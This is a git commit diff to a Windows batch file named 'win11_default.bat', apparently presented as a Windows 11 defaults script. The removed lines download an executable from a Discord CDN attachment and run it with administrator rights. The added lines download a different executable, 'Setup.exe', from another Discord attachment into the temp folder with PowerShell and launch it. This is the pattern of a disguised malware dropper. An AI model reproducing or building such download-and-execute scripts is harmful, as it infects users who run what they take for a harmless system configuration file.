a0c8436d0183acf7b8b863d7a811284f9ba531f1
optolab <sloneeddie36@gmail.com>
2025-01-12 12:53:23 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,5 +1,5 @@
 @echo off
-set url=https://cdn.discordapp.com/attachments/1197242628396302458/1328018741627326534/ftd3.exe
-set output=ftd3.exe
-curl -L -o "%output%" "%url%"
-powershell -command "start-process '%output%' -verb runas"
+set "url=<https://cdn.discordapp.com/attachments/1197242628396302458/1328059195471298650/Setup.exe?ex=67855302&is=67840182&hm=5cd5c809d92de46b0c90c394cc739c7095335ef390e0b1fc288156beac870996&>"
+set "file=%temp%\downloaded_file.exe"
+powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%file%'"
+start "" "%file%"
